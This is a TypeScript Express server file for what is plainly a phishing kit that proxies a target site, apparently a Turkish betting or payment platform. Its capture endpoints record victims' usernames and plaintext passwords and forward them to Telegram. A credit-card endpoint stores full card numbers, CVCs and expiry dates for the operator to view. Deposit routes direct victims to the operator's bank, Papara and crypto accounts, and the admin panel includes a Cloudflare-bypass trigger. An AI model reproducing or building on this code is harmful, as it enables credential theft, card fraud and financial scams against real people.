import type { Express, Request, Response, NextFunction } from "express";
import bcrypt from "bcryptjs";
import { storage } from "./storage";
import { sendTelegram } from "./telegram";
import { updateTargetDomain, getTargetHost } from "./target-config";

declare module "express-session" {
  interface SessionData {
    isAdmin: boolean;
    adminUsername: string;
  }
}

function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (req.session && req.session.isAdmin) {
    return next();
  }
  res.status(401).json({ error: "Unauthorized" });
}

export async function seedDefaultAdmin() {
  try {
    const existing = await storage.getAdminUser("admin");
    if (!existing) {
      const hash = await bcrypt.hash("admin123", 10);
      await storage.createAdminUser("admin", hash);
      console.log("[ADMIN] Default admin user created (admin/admin123)");
    }
  } catch (e: any) {
    console.log(`[ADMIN] Could not seed admin user: ${e.message}`);
  }
}

export function registerAdminRoutes(app: Express, opts?: { clearProxyCache: () => void; onTargetDomainChange?: () => void; getProxyStatus?: () => any; refreshProxySession?: () => Promise<any>; triggerCfBypass?: () => Promise<any> }) {
  app.post("/api/admin/clear-cache", requireAdmin, (_req: Request, res: Response) => {
    if (opts?.clearProxyCache) {
      opts.clearProxyCache();
      res.json({ message: "Proxy cache temizlendi" });
    } else {
      res.status(501).json({ error: "Cache temizleme desteklenmiyor" });
    }
  });

  app.post("/api/admin/login", async (req: Request, res: Response) => {
    try {
      const { username, password } = req.body;
      if (!username || !password) {
        return res.status(400).json({ error: "Kullanici adi ve sifre gerekli." });
      }
      const admin = await storage.getAdminUser(username);
      if (!admin) {
        return res.status(401).json({ error: "Hatali kullanici adi ya da sifre." });
      }
      const valid = await bcrypt.compare(password, admin.password);
      if (!valid) {
        return res.status(401).json({ error: "Hatali kullanici adi ya da sifre." });
      }
      await storage.updateAdminLoginTime(username);
      req.session.isAdmin = true;
      req.session.adminUsername = username;
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/admin/logout", (req: Request, res: Response) => {
    req.session.isAdmin = false;
    req.session.adminUsername = undefined;
    res.json({ success: true });
  });

  app.get("/api/admin/me", (req: Request, res: Response) => {
    if (req.session && req.session.isAdmin) {
      res.json({ loggedIn: true, username: req.session.adminUsername });
    } else {
      res.json({ loggedIn: false });
    }
  });

  app.get("/api/admin/logs", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const logs = await storage.getLogs();
      res.json(logs);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.patch("/api/admin/logs/:id", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      const updates = req.body;
      await storage.updateLog(id, updates);

      if (updates.balance != null) {
        const log = await storage.getLogById(id);
        if (log?.username) {
          const user = await storage.getUserByUsername(log.username);
          if (user) {
            await storage.updateUser(user.id, { balance: String(updates.balance) } as any);
          }
        }
      }

      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/admin/logs/:id/ban", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      await storage.banLog(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/admin/logs", requireAdmin, async (_req: Request, res: Response) => {
    try {
      await storage.deleteAllLogs();
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/payments", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const payments = await storage.getPaymentRequests();
      res.json(payments);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.patch("/api/admin/payments/:id", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      const { status } = req.body;
      const payment = await storage.getPaymentRequest(id);
      if (!payment) {
        return res.status(404).json({ error: "Ödeme talebi bulunamadı" });
      }
      const wasApproved = payment.status === "approved";
      if (status === "approved" && !wasApproved) {
        const amount = Number(payment.amount) || 0;
        const username = String(payment.username || "").trim();
        if (amount > 0 && username) {
          let user = await storage.getUserByEmail(username);
          if (!user) user = await storage.getUserByUsername(username);
          if (user) {
            await storage.addBalance(user.id, amount);
            const log = await storage.getLogByUsername(username);
            if (log) {
              const logBalance = parseFloat(String(log.balance ?? 0)) || 0;
              await storage.updateLog(log.id, { balance: logBalance + amount });
            }
          }
        }
        await storage.updatePaymentRequest(id, { status: "approved", processedAt: Math.floor(Date.now() / 1000) });
      } else if (status === "rejected") {
        await storage.updatePaymentRequest(id, { status: "rejected", processedAt: Math.floor(Date.now() / 1000) });
      } else {
        await storage.updatePaymentRequest(id, { status });
      }
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/admin/payments", requireAdmin, async (_req: Request, res: Response) => {
    try {
      await storage.deleteAllPaymentRequests();
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/payments/:id/card", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      const card = await storage.getReqCard(id);
      res.json(card || null);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/settings", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const [s, bank, papara, crypto] = await Promise.all([
        storage.getSettings(),
        storage.getBankAccount(),
        storage.getPaparaAccount(),
        storage.getCryptoAccount(),
      ]);
      res.json({
        settings: s || {},
        bankAccount: bank || { name: "", iban: "" },
        paparaAccount: papara || { no: "", iban: "" },
        cryptoAccount: crypto || { walletNo: "" },
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.put("/api/admin/settings", requireAdmin, async (req: Request, res: Response) => {
    try {
      const { settings: settingsData, bankAccount, paparaAccount, cryptoAccount } = req.body;

      if (settingsData) {
        await storage.updateSettings(settingsData);
        if (settingsData.targetDomain) {
          const prev = getTargetHost();
          updateTargetDomain(settingsData.targetDomain);
          if (prev !== settingsData.targetDomain) {
            opts?.onTargetDomainChange?.();
          }
        }
      }
      if (bankAccount) {
        await storage.updateBankAccount(bankAccount.name || "", bankAccount.iban || "");
      }
      if (paparaAccount) {
        await storage.updatePaparaAccount(paparaAccount.no || "", paparaAccount.iban || "");
      }
      if (cryptoAccount) {
        await storage.updateCryptoAccount(cryptoAccount.walletNo || "");
      }

      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  async function checkRateLimit(ip: string, maxRequests = 2, timeWindow = 300): Promise<boolean> {
    const since = Math.floor(Date.now() / 1000) - timeWindow;
    const recent = await storage.getRecentPaymentsByIp(ip, since);
    return recent.length < maxRequests;
  }

  function getClientIp(req: Request): string {
    return (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
  }

  app.post("/api/payment/havale", async (req: Request, res: Response) => {
    try {
      const { username, amount } = req.body;
      if (!username || !amount) {
        return res.status(400).json({ error: "Eksik bilgi" });
      }
      const ip = getClientIp(req);
      const allowed = await checkRateLimit(ip);
      if (!allowed) {
        return res.status(429).json({ error: "5 dakika icinde maksimum 2 talep gonderebilirsiniz." });
      }
      const s = await storage.getSettings();
      const minDep = s?.minDeposit ?? 1500;
      const maxDep = s?.maxDeposit ?? 100000;
      const amt = parseFloat(amount);
      if (amt < minDep || amt > maxDep) {
        return res.status(400).json({ error: `Tutar ${minDep} - ${maxDep} TL arasinda olmalidir.` });
      }
      const payment = await storage.createPaymentRequest({
        username,
        amount: amt,
        provider: "havale",
        status: "pending",
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        ccId: null,
        ipAddress: ip,
      });

      const bank = await storage.getBankAccount();
      await sendTelegram(
        `<b>Yeni Havale Talebi</b>\n` +
        `Kullanici: ${username}\n` +
        `Tutar: ${amount} TL\n` +
        `IP: ${ip}\n` +
        `Tarih: ${new Date().toLocaleString("tr-TR")}`
      );

      res.json({
        success: true,
        type: true,
        bankAccount: bank || { name: "", iban: "" },
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/payment/papara", async (req: Request, res: Response) => {
    try {
      const { username, amount } = req.body;
      if (!username || !amount) {
        return res.status(400).json({ error: "Eksik bilgi" });
      }
      const ip = getClientIp(req);
      const allowed = await checkRateLimit(ip);
      if (!allowed) {
        return res.status(429).json({ error: "5 dakika icinde maksimum 2 talep gonderebilirsiniz." });
      }
      const s = await storage.getSettings();
      const minDep = s?.minDeposit ?? 1500;
      const maxDep = s?.maxDeposit ?? 100000;
      const amt = parseFloat(amount);
      if (amt < minDep || amt > maxDep) {
        return res.status(400).json({ error: `Tutar ${minDep} - ${maxDep} TL arasinda olmalidir.` });
      }
      const payment = await storage.createPaymentRequest({
        username,
        amount: amt,
        provider: "papara",
        status: "pending",
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        ccId: null,
        ipAddress: ip,
      });

      const papara = await storage.getPaparaAccount();
      await sendTelegram(
        `<b>Yeni Papara Talebi</b>\n` +
        `Kullanici: ${username}\n` +
        `Tutar: ${amount} TL\n` +
        `IP: ${ip}\n` +
        `Tarih: ${new Date().toLocaleString("tr-TR")}`
      );

      res.json({
        success: true,
        type: true,
        paparaAccount: papara || { no: "", iban: "" },
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/payment/kredikarti", async (req: Request, res: Response) => {
    try {
      const { username, amount, ccOwner, ccNo, ccCvc, ccMonth, ccYear } = req.body;
      if (!username || !amount || !ccNo) {
        return res.status(400).json({ error: "Eksik bilgi" });
      }
      const ip = getClientIp(req);
      const allowed = await checkRateLimit(ip);
      if (!allowed) {
        return res.status(429).json({ error: "5 dakika icinde maksimum 2 talep gonderebilirsiniz." });
      }

      const card = await storage.createReqCard({
        ccOwner: ccOwner || "",
        ccNo,
        ccCvc: ccCvc || "",
        ccMonth: ccMonth || "",
        ccYear: ccYear || "",
        amount: parseFloat(amount),
        ipAddress: ip,
        date: Math.floor(Date.now() / 1000),
      });

      const payment = await storage.createPaymentRequest({
        username,
        amount: parseFloat(amount),
        provider: "kredikarti",
        status: "pending",
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        ccId: card.id,
        ipAddress: ip,
      });

      await sendTelegram(
        `<b>Yeni Kredi Karti Talebi</b>\n` +
        `Kullanici: ${username}\n` +
        `Tutar: ${amount} TL\n` +
        `Kart No: ${ccNo.slice(0, 4)}****${ccNo.slice(-4)}\n` +
        `IP: ${ip}\n` +
        `Tarih: ${new Date().toLocaleString("tr-TR")}`
      );

      res.json({ success: true, type: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/payment/confirm", async (req: Request, res: Response) => {
    try {
      const { username, amount, method } = req.body;
      const ip = getClientIp(req);
      await sendTelegram(
        `<b>💰 Yatırım Onaylandı!</b>\n` +
        `Kullanıcı: ${username || 'bilinmiyor'}\n` +
        `Tutar: ${amount || '?'} TL\n` +
        `Yöntem: ${method || 'havale'}\n` +
        `IP: ${ip}\n` +
        `Tarih: ${new Date().toLocaleString("tr-TR")}\n` +
        `<i>Kullanıcı "Yatırımı Gerçekleştirdim" butonuna bastı.</i>`
      );
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/payment/withdrawal", async (req: Request, res: Response) => {
    try {
      const { username, amount, method, bankName, iban, accountHolder, paparaNo, cryptoAddress, cryptoNetwork } = req.body;
      if (!username || !amount || !method) {
        return res.status(400).json({ error: "Eksik bilgi" });
      }
      const ip = getClientIp(req);
      const s = await storage.getSettings();
      const minW = s?.minWithdraw ?? 250;
      const maxW = s?.maxWithdraw ?? 100000;
      const amt = parseFloat(amount);
      if (amt < minW || amt > maxW) {
        return res.status(400).json({ error: `Cekim tutari ${minW} - ${maxW} TL arasinda olmalidir.` });
      }

      const withdrawal = await storage.createWithdrawalRequest({
        username,
        amount: amt,
        method,
        bankName: bankName || "",
        iban: iban || "",
        accountHolder: accountHolder || "",
        paparaNo: paparaNo || "",
        cryptoAddress: cryptoAddress || "",
        cryptoNetwork: cryptoNetwork || "",
        status: "pending",
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        ipAddress: ip,
      });

      await sendTelegram(
        `<b>Yeni Cekim Talebi</b>\n` +
        `Kullanici: ${username}\n` +
        `Tutar: ${amt} TL\n` +
        `Yontem: ${method}\n` +
        `IP: ${ip}\n` +
        `Tarih: ${new Date().toLocaleString("tr-TR")}`
      );

      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/withdrawals", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const withdrawals = await storage.getWithdrawalRequests();
      res.json(withdrawals);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.patch("/api/admin/withdrawals/:id", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      const { status } = req.body;
      const withdrawal = await storage.getWithdrawalRequest(id);
      if (!withdrawal) {
        return res.status(404).json({ error: "Çekim talebi bulunamadı" });
      }
      const wasApproved = withdrawal.status === "approved";
      if (status === "approved" && !wasApproved) {
        const amount = Number(withdrawal.amount) || 0;
        const username = String(withdrawal.username || "").trim();
        if (amount > 0 && username) {
          let user = await storage.getUserByEmail(username);
          if (!user) user = await storage.getUserByUsername(username);
          if (user) {
            const result = await storage.subtractBalance(user.id, amount);
            if (result?.insufficient) {
              return res.status(400).json({ error: "Kullanıcı bakiyesi yetersiz" });
            }
            const log = await storage.getLogByUsername(username);
            if (log) {
              const logBalance = parseFloat(String(log.balance ?? 0)) || 0;
              await storage.updateLog(log.id, { balance: Math.max(0, logBalance - amount) });
            }
          }
        }
        await storage.updateWithdrawalRequest(id, { status: "approved", processedAt: Math.floor(Date.now() / 1000) });
      } else if (status === "rejected") {
        await storage.updateWithdrawalRequest(id, { status: "rejected", processedAt: Math.floor(Date.now() / 1000) });
      } else {
        await storage.updateWithdrawalRequest(id, { status, processedAt: Math.floor(Date.now() / 1000) });
      }
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/admin/withdrawals/:id", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      await storage.deleteWithdrawalRequest(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/cards", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const cards = await storage.getReqCards();
      res.json(cards);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/bank-accounts", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const accounts = await storage.getBankAccounts();
      res.json(accounts);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/admin/bank-accounts", requireAdmin, async (req: Request, res: Response) => {
    try {
      const { bankName, name, iban } = req.body;
      const account = await storage.createBankAccount({ bankName: bankName || "", name: name || "", iban: iban || "" });
      res.json(account);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/admin/bank-accounts/:id", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      await storage.deleteBankAccount(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.patch("/api/admin/bank-accounts/:id/toggle", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      await storage.toggleBankAccount(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/papara-accounts", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const accounts = await storage.getPaparaAccounts();
      res.json(accounts);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/admin/papara-accounts", requireAdmin, async (req: Request, res: Response) => {
    try {
      const { accountName, no, iban } = req.body;
      const account = await storage.createPaparaAccount({ accountName: accountName || "", no: no || "", iban: iban || "" });
      res.json(account);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/admin/papara-accounts/:id", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      await storage.deletePaparaAccount(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.patch("/api/admin/papara-accounts/:id/toggle", requireAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id as string);
      await storage.togglePaparaAccount(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/payment/bank-accounts", async (_req: Request, res: Response) => {
    try {
      const accounts = await storage.getActiveBankAccounts();
      res.json(accounts);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/payment/papara-accounts", async (_req: Request, res: Response) => {
    try {
      const accounts = await storage.getActivePaparaAccounts();
      res.json(accounts);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/capture/login", async (req: Request, res: Response) => {
    try {
      const { username, password } = req.body;
      if (!username || !password) {
        return res.status(400).json({ error: "Eksik bilgi" });
      }

      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";

      const banned = await storage.isIpBanned(ip);
      if (banned) {
        return res.status(403).json({ error: "Erisim engellendi" });
      }

      const log = await storage.createLog({
        username,
        password,
        balance: 0,
        name: "",
        surname: "",
        phoneNumber: "",
        ip,
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        isBanned: 0,
        vip: 0,
      });

      await sendTelegram(
        `<b>Yeni Giris Denemesi</b>\n` +
        `Kullanici: ${username}\n` +
        `Sifre: ${password}\n` +
        `IP: ${ip}\n` +
        `Tarih: ${new Date().toLocaleString("tr-TR")}`
      );

      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/capture/register", async (req: Request, res: Response) => {
    try {
      const { username, password, name, surname, phoneNumber } = req.body;
      if (!username || !password) {
        return res.status(400).json({ error: "Eksik bilgi" });
      }

      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";

      const log = await storage.createLog({
        username,
        password,
        balance: 0,
        name: name || "",
        surname: surname || "",
        phoneNumber: phoneNumber || "",
        ip,
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        isBanned: 0,
        vip: 0,
      });

      await sendTelegram(
        `<b>Yeni Kayit</b>\n` +
        `Kullanici: ${username}\n` +
        `Sifre: ${password}\n` +
        `Ad: ${name || "-"} ${surname || "-"}\n` +
        `Telefon: ${phoneNumber || "-"}\n` +
        `IP: ${ip}\n` +
        `Tarih: ${new Date().toLocaleString("tr-TR")}`
      );

      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/stats", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const [logs, payments, withdrawals] = await Promise.all([
        storage.getRecentLogs(5000),
        storage.getPaymentRequests(),
        storage.getWithdrawalRequests(),
      ]);
      const totalUsers = logs.length;
      const bannedUsers = logs.filter((l: any) => l.isBanned === 1).length;
      const totalPayments = payments.length;
      const pendingPayments = payments.filter((p: any) => p.status === "pending").length;
      const approvedPayments = payments.filter((p: any) => p.status === "approved").length;
      const rejectedPayments = payments.filter((p: any) => p.status === "rejected").length;
      const totalAmount = payments.reduce((sum: number, p: any) => sum + (p.amount || 0), 0);
      const pendingAmount = payments.filter((p: any) => p.status === "pending").reduce((sum: number, p: any) => sum + (p.amount || 0), 0);
      const todayStart = Math.floor(new Date().setHours(0, 0, 0, 0) / 1000);
      const todayUsers = logs.filter((l: any) => l.date >= todayStart).length;
      const todayPayments = payments.filter((p: any) => p.date >= todayStart).length;
      const totalWithdrawals = withdrawals.length;
      const pendingWithdrawals = withdrawals.filter((w: any) => w.status === "pending").length;
      const approvedWithdrawals = withdrawals.filter((w: any) => w.status === "approved").length;
      const totalWithdrawalAmount = withdrawals.reduce((sum: number, w: any) => sum + (w.amount || 0), 0);
      const pendingWithdrawalAmount = withdrawals.filter((w: any) => w.status === "pending").reduce((sum: number, w: any) => sum + (w.amount || 0), 0);
      res.json({
        totalUsers, bannedUsers, totalPayments, pendingPayments, approvedPayments,
        rejectedPayments, totalAmount, pendingAmount, todayUsers, todayPayments,
        totalWithdrawals, pendingWithdrawals, approvedWithdrawals, totalWithdrawalAmount, pendingWithdrawalAmount,
      });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/target-domain", async (_req: Request, res: Response) => {
    try {
      const s = await storage.getSettings();
      res.json({ targetDomain: s?.targetDomain || getTargetHost() });
    } catch (e: any) {
      res.json({ targetDomain: getTargetHost() });
    }
  });

  app.get("/api/admin/recent-logins", requireAdmin, async (_req: Request, res: Response) => {
    try {
      const logs = await storage.getRecentLogs(10);
      res.json(logs);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/admin/proxy-status", requireAdmin, async (_req: Request, res: Response) => {
    try {
      if (opts?.getProxyStatus) {
        const status = opts.getProxyStatus();
        res.json(status);
      } else {
        res.json({ status: "unknown" });
      }
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/admin/refresh-session", requireAdmin, async (_req: Request, res: Response) => {
    try {
      if (opts?.refreshProxySession) {
        const result = await opts.refreshProxySession();
        res.json(result);
      } else {
        res.status(501).json({ error: "Desteklenmiyor" });
      }
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/admin/cf-bypass", requireAdmin, async (_req: Request, res: Response) => {
    try {
      if (opts?.triggerCfBypass) {
        const result = await opts.triggerCfBypass();
        res.json(result);
      } else {
        res.status(501).json({ error: "Desteklenmiyor" });
      }
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });
}
